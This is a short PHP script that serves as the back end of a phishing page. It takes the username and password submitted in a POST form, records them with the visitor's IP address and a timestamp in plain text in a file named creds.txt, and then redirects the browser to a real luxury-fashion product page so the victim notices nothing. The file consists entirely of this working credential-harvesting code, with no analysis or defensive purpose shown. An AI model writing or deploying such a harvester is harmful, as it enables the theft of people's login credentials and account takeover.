<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? 'UNKNOWN';
    $password = $_POST['password'] ?? 'UNKNOWN';
    $ip = $_SERVER['REMOTE_ADDR'];
    $time = date("Y-m-d H:i:s");

    $log = "[$time] IP: $ip | Username: $username | Password: $password\n";

    file_put_contents("creds.txt", $log, FILE_APPEND);

    header("Location: https://www.ysl.com/en-us/pr/opyum-sandals-in-patent-leather-5576621TV1A1000.html");
    exit;
}
?>
